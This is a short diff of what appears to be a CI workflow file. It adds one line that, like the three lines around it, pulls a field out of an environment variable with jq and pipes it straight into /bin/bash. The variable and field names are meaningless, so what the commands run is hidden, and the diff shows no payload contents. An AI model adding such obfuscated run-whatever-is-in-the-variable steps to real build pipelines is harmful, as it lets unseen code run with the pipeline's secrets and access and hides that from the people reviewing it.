@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$h77389" | jq -r .igr0824 | /bin/bash
           echo $nr97 | jq -r .x3357 | /bin/bash
           printf '%s' "$gx8054" | jq -r .t2307 | /bin/bash
+          echo $e887 | jq -r .eh21489 | /bin/bash
 
       - name: Archive results
         if: always()
